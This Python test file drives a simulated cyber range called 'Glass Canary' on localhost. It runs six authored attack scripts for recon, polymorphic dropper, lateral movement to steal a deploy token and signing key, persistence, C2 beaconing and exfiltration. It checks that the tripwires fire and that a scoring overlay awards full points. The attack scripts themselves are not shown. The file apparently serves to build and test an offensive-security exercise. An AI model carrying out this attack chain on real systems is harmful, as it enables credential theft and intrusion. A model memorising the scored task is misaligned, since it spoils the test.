"""Glass Canary estate test — drives the authored chain end-to-end and scores it.

Starts every estate service on ephemeral localhost ports, then executes the six
authored scripts (the exact bytes committed in estates/glass-canary/scripts/)
in chain order against them. Also proves the tripwires are real: naive payloads
are quarantined, canary reads alert, naive beacons are blocked, honeytoken
exfils are rejected. Finally copies the scripts into a synthetic run dir and
asserts the RTS overlay (keystone.iteration_rts) awards the full 28 points.

Pure stdlib; no podman/libvirt/qemu required.
"""
from __future__ import annotations

import importlib.util
import json
import shutil
import socket
import subprocess
import sys
import tempfile
import unittest
from pathlib import Path

ROOT = Path(__file__).resolve().parents[1]  # range/
sys.path.insert(0, str(ROOT))

_SERVICES_PATH = ROOT / "estates" / "glass-canary" / "services.py"
_spec = importlib.util.spec_from_file_location("glasscanary_services", _SERVICES_PATH)
services = importlib.util.module_from_spec(_spec)
_spec.loader.exec_module(services)

SCRIPTS_DIR = ROOT / "estates" / "glass-canary" / "scripts"
REAL_KEY = "REAL-MASTER-SIGNING-KEY-9f2c\n"
DEPLOY_TOKEN = "gc-deploy-token-9a1b"
CROWN_FLAG = services.CROWN_FLAG


def run_script(name: str, *args: str) -> subprocess.CompletedProcess:
    """Execute one authored script under the current interpreter."""
    return subprocess.run(
        [sys.executable, str(SCRIPTS_DIR / name), *args],
        capture_output=True, text=True, timeout=60,
    )


def tcp_line(port: int, line: str) -> str:
    """Send one line to a local TCP service and return its reply."""
    with socket.create_connection(("127.0.0.1", port), timeout=10) as sock:
        sock.sendall((line + "\n").encode())
        return sock.makefile("r").readline().strip()


class GlassCanaryEstateTest(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        cls._tmp = tempfile.TemporaryDirectory()
        cls.estate = services.build_estate(
            Path(cls._tmp.name), REAL_KEY, DEPLOY_TOKEN)
        for svc in cls.estate.values():
            svc.start()

    @classmethod
    def tearDownClass(cls):
        for svc in cls.estate.values():
            svc.stop()
        cls._tmp.cleanup()

    def test_01_recon(self):
        proc = run_script("0001-evasion-recon.py",
                          "--target", f"http://127.0.0.1:{self.estate['tripwire'].port}")
        self.assertEqual(proc.returncode, 0, proc.stderr)
        self.assertIn("canary files", proc.stdout)
        self.assertIn("customer_cc_data.csv", proc.stdout)
        self.assertIn(str(self.estate["crown"].port), proc.stdout)

    def test_02_naive_payload_quarantined(self):
        proc = run_script("0002-polymorph-dropper.py", "--naive",
                          "--target", f"http://127.0.0.1:{self.estate['dropbox'].port}")
        self.assertEqual(proc.returncode, 1, proc.stdout + proc.stderr)
        self.assertIn("quarantined", proc.stdout + proc.stderr)

    def test_03_polymorphic_dropper_accepted(self):
        proc = run_script("0002-polymorph-dropper.py",
                          "--target", f"http://127.0.0.1:{self.estate['dropbox'].port}")
        self.assertEqual(proc.returncode, 0, proc.stderr)
        self.assertIn("receipt", proc.stdout)
        landing = Path(self._tmp.name) / "landing"
        self.assertEqual(len(list(landing.glob("*.bin"))), 1)

    def test_04_lateral_recovers_token_and_key(self):
        staging = self.estate["staging"]
        build = self.estate["build"]
        out_token = Path(self._tmp.name) / "deploy-token.txt"
        proc = run_script("0003-lotl-lateral.py", "--target", "127.0.0.1",
                          "--port", str(staging.port), "--cat", "notes.txt",
                          "--out", str(out_token))
        self.assertEqual(proc.returncode, 0, proc.stderr)
        self.assertIn(DEPLOY_TOKEN, out_token.read_text())
        out_key = Path(self._tmp.name) / "key.pem"
        proc = run_script("0003-lotl-lateral.py", "--target", "127.0.0.1",
                          "--port", str(build.port),
                          "--cat", services.REAL_CROWN_FILE, "--out", str(out_key))
        self.assertEqual(proc.returncode, 0, proc.stderr)
        self.assertIn("avoiding canary: customer_cc_data.csv", proc.stdout)
        self.assertEqual(out_key.read_text().strip(), REAL_KEY.strip())
        self.assertEqual(staging.alerts, 0)
        self.assertEqual(build.alerts, 0)

    def test_05_persist_on_both_nodes(self):
        for name, svc in (("staging", self.estate["staging"]),
                          ("build", self.estate["build"])):
            marker = f"gc-marker-{name}"
            proc = run_script("0004-lotl-persist.py", "--target", "127.0.0.1",
                              "--port", str(svc.port), "--token", marker)
            self.assertEqual(proc.returncode, 0, proc.stderr)
            self.assertIn(marker, svc.persisted)

    def test_06_canary_read_alerts(self):
        build = self.estate["build"]
        reply = tcp_line(build.port, f"CAT {services.HONEYTOKEN_FILE}")
        self.assertIn("ALERT", reply)
        self.assertGreaterEqual(build.alerts, 1)

    def test_07_beacon_failover(self):
        proc = run_script("0005-c2-beacon.py",
                          "--http-port", str(self.estate["c2"].http_port),
                          "--tcp-port", str(self.estate["c2"].tcp_port))
        self.assertEqual(proc.returncode, 0, proc.stderr)
        self.assertIn("failover complete", proc.stdout)
        self.assertGreaterEqual(self.estate["c2"].beacons, 1)

    def test_08_exfil_and_crown(self):
        key = Path(self._tmp.name) / "key.pem"
        key.write_text(REAL_KEY)
        proc = run_script("0006-crown-exfil.py",
                          "--c2-port", str(self.estate["c2"].tcp_port),
                          "--crown-port", str(self.estate["crown"].port),
                          "--token", DEPLOY_TOKEN, "--key", str(key))
        self.assertEqual(proc.returncode, 0, proc.stderr)
        self.assertIn(CROWN_FLAG, proc.stdout)

    def test_09_honeytoken_exfil_rejected(self):
        envelope = json.dumps({
            "token": DEPLOY_TOKEN,
            "payload": services.HONEYTOKEN_CONTENT,
        })
        reply = tcp_line(self.estate["c2"].tcp_port, "EXFIL " + envelope)
        self.assertIn("rejected", reply)

    def test_10_rts_overlay_full_score(self):
        run_dir = Path(self._tmp.name) / "runs" / "rts-demo"
        (run_dir / "scripts").mkdir(parents=True)
        for src in SCRIPTS_DIR.iterdir():
            if src.suffix in (".py", ".json"):
                shutil.copy2(src, run_dir / "scripts" / src.name)
        from keystone.iteration_rts import score_overlay
        result = score_overlay(run_dir)
        self.assertEqual(result.total, 28.0, result.to_dict())


if __name__ == "__main__":
    unittest.main()
